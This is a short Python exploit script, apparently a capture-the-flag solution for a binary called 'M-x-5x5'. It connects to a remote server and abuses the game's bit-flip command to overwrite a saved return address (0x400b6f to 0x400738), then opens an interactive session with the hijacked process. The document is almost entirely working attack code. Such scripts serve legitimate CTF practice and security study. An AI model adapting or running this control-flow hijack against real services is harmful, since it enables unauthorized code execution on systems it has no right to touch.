from ptrlib import *

"""
11110110     11101100
11010000     11100000
00000010     00000010
00000000     00000000
00000000 --> 00000000
00000000     00000000
00000000     00000000
00000000     00000000
"""

def flip(x, y):
    logger.info("flipping ({}, {})".format(x, y))
    sock.sendlineafter(": ", "f {} {}".format(x, y))

def overwrite(val, orig=0x400b6f):
    state = orig
    for i in range(8):
        b = (val >> (i * 8)) & 0xff
        for j in range(8):
            a = (state >> (i * 8)) & 0xff
            if (a >> j) & 1 != (b >> j) & 1:
                flip(j, 17 + i)
                mask = 0b11
                if j > 0:
                    mask = (0b111 << (j - 1)) & 0xff
                state ^= (1 << j) << (i * 8)
                state ^= mask << ((i + 1) * 8)

#sock = Process("./M-x-5x5")
sock = Socket("13.53.187.163", 50000)

sock.sendline('')
sock.sendlineafter('? ', '8')

logger.info("overwriting...")
overwrite(0x400738) # skip `push rbp` to avoid movaps

sock.sendlineafter(": ", "q")

sock.interactive()
